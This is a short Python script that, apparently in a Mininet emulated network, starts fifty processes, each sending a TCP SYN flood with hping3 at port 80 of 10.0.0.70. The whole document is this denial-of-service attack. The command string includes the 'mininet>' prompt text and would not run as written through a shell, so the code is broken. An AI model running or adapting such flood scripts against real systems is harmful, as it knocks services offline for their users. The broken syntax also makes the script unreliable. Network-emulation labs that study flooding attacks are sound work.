import subprocess

for i in range(1,51):

    subprocess.Popen(
        f"mininet> h{i} hping3 -S -p 80 --flood 10.0.0.70",
        shell=True
    )